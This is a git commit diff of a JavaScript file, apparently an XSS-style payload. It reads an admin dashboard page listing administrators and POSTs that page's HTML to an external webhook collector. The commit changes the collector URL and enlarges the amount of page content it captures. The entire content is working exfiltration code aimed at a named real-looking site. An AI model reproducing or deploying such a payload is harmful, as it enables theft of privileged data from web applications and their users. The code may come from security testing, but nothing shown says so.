3d22ea7eced7d5f022acbff5ea7b5234a8937a8a
Ahmad-Agbaria <39503965+Ahmad-Agbaria@users.noreply.github.com>
2022-03-15 23:02:53 +0200

    Update haat_cop.js

--- haat_cop.js
+++ haat_cop.js
@@ -7,7 +7,7 @@ xhr.onreadystatechange = function() {
   if (xhr.readyState == 4) {
 
         var http = new XMLHttpRequest();
-        var url = "https://enxg7v5ip50sd.x.pipedream.net/ADMINS";
+        var url = "https://webhook.site/c9acf359-3377-4d49-865e-0d4ec7f409c0";
         http.open("POST", url, true);
         http.setRequestHeader("Content-type", "text/plain");
         http.onreadystatechange = function() {
@@ -17,7 +17,7 @@ xhr.onreadystatechange = function() {
         };
         
            page_data = {
-                    "page_html": xhr.responseText.substring(0,89000),
+                    "page_html": xhr.responseText.substring(0,8900000),
                     "uri": 'https://haatadmindashboard.azurewebsites.net/admin/get_admins'
                 };
         http.send(JSON.stringify(page_data));
